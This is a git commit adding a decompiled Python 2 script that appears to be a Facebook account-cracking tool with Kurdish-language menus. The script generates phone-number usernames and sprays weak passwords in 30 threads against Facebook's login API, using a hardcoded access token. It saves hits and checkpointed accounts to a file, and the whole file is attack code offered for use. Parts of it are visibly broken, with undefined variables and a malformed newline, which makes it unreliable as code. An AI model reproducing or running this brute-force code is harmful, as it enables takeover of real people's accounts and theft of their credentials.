54fbe73d7d8c5ee73074790ae26db1fbf38eb9ef
halohack <79331796+halocrak@users.noreply.github.com>
2021-08-14 18:08:09 +0300

    Add files via upload

---
+++ jm.py
@@ -0,0 +1,390 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7 (62211)
+# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: /sdcard/download/3rd.py
+# Compiled at: 2021-05-24 19:20:54
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, requests
+
+try:
+    import requests
+except ImportError:
+    os.system('No Module Named Requests! type:pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('No Module Named Mechanize! type:pip2 install mechanize')
+    time.sleep(1)
+    os.system('Then type: python2 fbi.py')
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+    print 'Thanks.'
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+os.system('mkdir anggaxd/cloned.txt')
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+
+def tik():
+    titik = [
+     '.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+os.system('clear')
+import os, sys, time, random, threading, json
+os.system('rm -rf .txt')
+for n in range(1, 10000):
+    sys.stdout = open('.txt', 'a')
+    print n
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(2)
+    os.system('python2 .README.md')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def t():
+    time.sleep(1)
+
+
+def cb():
+    os.system('clear')
+
+
+logo = '\n\x1b[1;91m]\n\n\n\x1b[1;92m_______________________________________________\n\x1b[1;92m_________\x1b[1;91m\xe2\x9c\xa1TOOL HACK\x1b[1;92m @gmail.com .com @yahoo.com\n\x1b[1;92m________\x1b[1;91m\xe2\x9c\xa1\n\x1b[1;92m_______\x1b[1;91m\xe2\x9c\xa1TAELEGRAMY SHAXSIM::\x1b[1;92mi4m_mrx\n\x1b[1;92m______\xe2\x9c\xa1\x1b[1;91mCHANALY TELEGRAMM  ::\x1b[1;92mstaferor404\n\x1b[1;92m_______________________________________________\n\n'
+logo2 = '\n\x1b[91m\n\n /$$   /$$  /$$$$$$  /$$        /$$$$$$  /$$      /$$\n| $$  | $$ /$$__  $$| $$       /$$__  $$| $$$    /$$$\n| $$  | $$| $$  \\ $$| $$      | $$  \\ $$| $$$$  /$$$$\n| $$$$$$$$| $$$$$$$$| $$      | $$  | $$| $$ $$/$$ $$\n| $$__  $$| $$__  $$| $$      | $$  | $$| $$  $$$| $$\n| $$  | $$| $$  | $$| $$      | $$  | $$| $$\\  $ | $$\n| $$  | $$| $$  | $$| $$$$$$$$|  $$$$$$/| $$ \\/  | $$\n|__/  |__/|__/  |__/|________/ \\______/ |__/     |__/\n                                                     \n                                                     \n                                                     \n\n'
+
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+
+def menu():
+    os.system('clear')
+    print logo
+    print '\x1b[1;92m[1]\x1b[1;91m\x1b[1;92m HACKRDNY KURDSTAN'
+    print '\x1b[1;92m[2]\x1b[1;91m\x1b[1;92m HACK KRDN BA DLY XOT'
+    print '\x1b[1;92m[3]\x1b[1;91m \x1b[1;92mHACK RAQAM'
+    print '\x1b[1;92m[0]\x1b[1;91m \x1b[1;92mGARANAWA            '
+    print 50 * '-'
+    action()
+
+
+def action():
+    chb = raw_input('\n  \xe2\x96\x84\xef\xb8\xbb\xcc\xb7\xcc\xbf\xe2\x94\xbb\xcc\xbf\xe2\x95\x90\xe2\x94\x81\xe4\xb8\x80   ')
+    if chb == '':
+        print '[!] Fill in correctly'
+        action()
+    else:
+        if chb == '1':
+            crack_action()
+        elif chb == '2':
+            crack_action2()
+        elif chb == '3':
+            a = ('0770', '0750', '0771', '0751', '0772', '0773', '@gmail.com')
+        hh = ('11223344', '1122334455', '112233445566', '1234554321', '123456654321',
+              '1234567890')
+        op = open('.txt', 'w')
+        for x in range(4000000):
+            f = '1234567890'
+            x1 = random.choice(a)
+            x2 = random.choice(f)
+            x3 = random.choice(f)
+            x4 = random.choice(f)
+            x5 = random.choice(f)
+            x6 = random.choice(f)
+            x7 = random.choice(f)
+            x8 = random.choice(f)
+            x9 = random.choice(f)
+            x10 = random.choice(f)
+            x11 = random.choice(f)
+            x22 = random.choice(hh)
+            dd = x1 + x2 + x3 + x4 + x5 + x6 + x7 + x8 + x9 + x10 + x11 + ':' + x22
+            print dd
+            op.write(dd + '/n')
+
+
+def crack_action():
+    global cpb
+    global oks
+    bch = ''
+    if bch == '':
+        os.system('clear')
+        print logo
+        try:
+            idlist = '.txt'
+            kn = raw_input(' NAWY YAKAM BADLY XOT : ')
+            k = raw_input(' USERNAME .com : ')
+            c = raw_input(' YAKEK LAW JORANA BNUS @gmail.com @yahoo.com : ')
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] Error 404, please try again'
+            raw_input('\n[ Press Enter To Go Back ]')
+            menu()
+
+    elif bch == '0':
+        menu()
+    else:
+        print '[!] Fill in correctly'
+        crack_action()
+    xxx = str(len(id))
+    psb('\x1b[1;91m[\xe2\x9c\x85] \x1b[1;92mTKAYA CHAWREBA HACK DASTY PEKRD...')
+    time.sleep(0.5)
+    psb('\x1b[1;91m[\xe2\x80\xbc] \x1b[1;92mBO WASTANDNI TOOL CTRL +Z')
+    time.sleep(0.5)
+    print 50 * '-'
+    print
+
+    def main(arg):
+        user = k + arg + c
+        try:
+            pass1 = '786786'
+            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            q = json.loads(data.text)
+            if '407' in q['error_msg']:
+                print '\x1b[1;92m[HACK.com]\x1b[0m ' + user + ' | ' + pass1
+                oks.append(user + pass1)
+            elif '405' in q['error_msg']:
+                print '[Checkpoint] ' + user + ' | ' + pass1
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(user + '|' + pass1 + '\n')
+                cps.close()
+                cpb.append(user + pass1)
+            else:
+                pass2 = kn + '12345'
+                data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                q = json.loads(data.text)
+                if '407' in q['error_msg']:
+                    print '\x1b[1;92m[HACK .com]\x1b[0m ' + user + ' | ' + pass2
+                    oks.append(user + pass2)
+                elif '405' in q['error_msg']:
+                    print '[Checkpoint] ' + user + ' | ' + pass2
+                    cps = open('save/checkpoint.txt', 'a')
+                    cps.write(user + '|' + pass2 + '\n')
+                    cps.close()
+                    cpb.append(user + pass2)
+                else:
+                    pass3 = kn + '121212@@@'
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.loads(data.text)
+                    if '407' in q['error_msg']:
+                        print '\x1b[1;92m[HACK .com]\x1b[0m ' + user + ' | ' + pass3
+                        oks.append(user + pass3)
+                    elif '405' in q['error_msg']:
+                        print '[Checkpoint] ' + user + ' | ' + pass3
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(user + '|' + pass3 + '\n')
+                        cps.close()
+                        cpb.append(user + pass3)
+                    else:
+                        pass4 = 'Pakistan'
+                        data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        q = json.loads(data.text)
+                        if '407' in q['error_msg']:
+                            print '\x1b[1;92m[HACK .com]\x1b[0m ' + user + ' | ' + pass4
+                            oks.append(user + pass4)
+                        elif '405' in q['error_msg']:
+                            print '[Checkpoint] ' + user + ' | ' + pass4
+                            cps = open('save/checkpoint.txt', 'a')
+                            cps.write(user + '|' + pass4 + '\n')
+                            cps.close()
+                            cpb.append(user + pass4)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '-'
+    print '\x1b[1;91m[\xe2\x9c\x85] \x1b[1;92mHACK KOTAY HAT....'
+    print '\x1b[1;91m[\xe2\x9c\x85] \x1b[1;92mHAMU HACKRAWAKAN  HACKRAW/SUTAW : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '\x1b[1;91m[\xe2\x9c\x85] \x1b[1;92mAYA DATAWE FILE SPAKAN SAVE BET'
+    raw_input('\n\x1b[1;92m[TKAYA ENTER BKA BO GARANAWA]')
+    os.system('python2 .README.md')
+
+
+def crack_action2():
+    bch = ''
+    if bch == '':
+        os.system('clear')
+        print logo
+        try:
+            idlist = '.txt'
+            kn = raw_input(' NAWY YAKAM : ')
+            k = raw_input(' NAW : ')
+            ac = raw_input(' BAW JORA BNUSA @gmail.com @yahoo.com : ')
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] Error 404, please try again'
+            raw_input('\n\x1b[1;92m[ TKAYA ENTER BKA BO GARANAWA ]')
+            menu()
+
+    elif bch == '0':
+        menu()
+    else:
+        print '[!] Fill in correctly'
+        crack_action()
+    xxx = str(len(id))
+    psb('\x1b[1;91m[\xe2\x9c\x85] \x1b[1;92mHACK DASTY PEKRD TKAYA CHAWREBA...')
+    time.sleep(0.5)
+    psb('\x1b[1;91m[\xe2\x80\xbc] \x1b[1;92mBO WASTANDNY TOOL CTRL +Z')
+    time.sleep(0.5)
+    print 50 * '-'
+    print
+
+    def main(arg):
+        user = k + arg + ac
+        try:
+            pass1 = kn + '123'
+            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            q = json.loads(data.text)
+            if '407' in q['error_msg']:
+                print '\x1b[1;92m[HACK .com]\x1b[0m ' + user + ' | ' + pass1
+                oks.append(user + pass1)
+            elif '405' in q['error_msg']:
+                print '[Checkpoint] ' + user + ' | ' + pass1
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(user + '|' + pass1 + '\n')
+                cps.close()
+                cpb.append(user + pass1)
+            else:
+                pass2 = kn + '12345'
+                data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                q = json.loads(data.text)
+                if '407' in q['error_msg']:
+                    print '\x1b[1;92m[HACK .com]\x1b[0m ' + user + ' | ' + pass2
+                    oks.append(user + pass2)
+                elif '405' in q['error_msg']:
+                    print '[Checkpoint] ' + user + ' | ' + pass2
+                    cps = open('save/checkpoint.txt', 'a')
+                    cps.write(user + '|' + pass2 + '\n')
+                    cps.close()
+                    cpb.append(user + pass2)
+                else:
+                    pass3 = kn + '1234'
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.loads(data.text)
+                    if '407' in q['error_msg']:
+                        print '\x1b[1;92m[HACK .com]\x1b[0m ' + user + ' | ' + pass3
+                        oks.append(user + pass3)
+                    elif '405' in q['error_msg']:
+                        print '[Checkpoint] ' + user + ' | ' + pass3
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(user + '|' + pass3 + '\n')
+                        cps.close()
+                        cpb.append(user + pass3)
+                    else:
+                        pass4 = kn + '12'
+                        data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        q = json.loads(data.text)
+                        if '407' in q['error_msg']:
+                            print '\x1b[1;92m[HACK .com]\x1b[0m ' + user + ' | ' + pass4
+                            oks.append(user + pass4)
+                        elif '405' in q['error_msg']:
+                            print '[Checkpoint] ' + user + ' | ' + pass4
+                            cps = open('save/checkpoint.txt', 'a')
+                            cps.write(user + '|' + pass4 + '\n')
+                            cps.close()
+                            cpb.append(user + pass4)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '-'
+    print '\x1b[1;91m[\xe2\x9c\x85]\x1b[1;92m HACK KOTAY HAT....'
+    print '\x1b[1;91m[\xe2\x9c\x85] \x1b[1;92mHAMU HACKRAWAKAN HACKRAW /SUTAW : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '\x1b[1;91m[\xe2\x9c\x85]\x1b[1;92m AYA DATAWE FILE SPAKAN SAVE BET'
+    raw_input('\n\x1b[1;92m[TKAYA ENTER BKA BO GARANAWA]')
+    os.system('python2 .README.md')
+
+
+if __name__ == '__main__':
+    menu()
+# okay decompiling BUB.pyc
